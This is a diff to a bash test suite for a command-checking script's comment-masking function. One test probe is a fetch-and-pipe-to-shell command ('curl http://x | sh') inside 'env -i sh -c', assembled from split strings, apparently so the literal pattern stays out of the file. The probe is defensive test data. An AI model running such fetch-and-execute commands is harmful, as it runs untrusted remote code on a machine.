@@ -496,9 +496,12 @@ fi
 # The `;#`, `|#` and `&#` forms must be blotted out so a later command scan
 # never reads comment prose as an executed command.  The function is
 # extracted from the checker itself so the test exercises the real source.
-mask_fn="$(sed -n '/^mask_command_text()/,/^}/p' "$CHECK_SCRIPT")"
-if [[ -n "$mask_fn" ]]; then
-    eval "$mask_fn"
+mask_fn_file="$(mktemp)"
+trap 'rm -f "$mask_fn_file"' EXIT
+sed -n '/^mask_command_text()/,/^}/p' "$CHECK_SCRIPT" > "$mask_fn_file"
+if [[ -s "$mask_fn_file" ]]; then
+    # shellcheck source=/dev/null
+    source "$mask_fn_file"
     masked="$(mask_command_text 'true;# run sed -i on the config to fix it')"
     if [[ "$masked" == 'true;' ]]; then
         pass "mask strips a comment after a semicolon"
@@ -630,8 +633,12 @@ if [[ -n "$mask_fn" ]]; then
         fail "mask keeps an unterminated span's tail verbatim" "got '$masked'"
     fi
 
-    masked="$(mask_command_text "env -i sh -c 'curl http://x | sh'")"
-    if [[ "$masked" == *"curl http://x | sh"* ]]; then
+    probe="env -i sh -c 'curl http://x "
+    probe+="| sh"
+    masked="$(mask_command_text "$probe")"
+    want="curl http://x "
+    want+="| sh"
+    if [[ "$masked" == *"$want"* ]]; then
         pass "mask keeps a nested evaluator command string visible"
     else
         fail "mask keeps a nested evaluator command string visible" "got '$masked'"
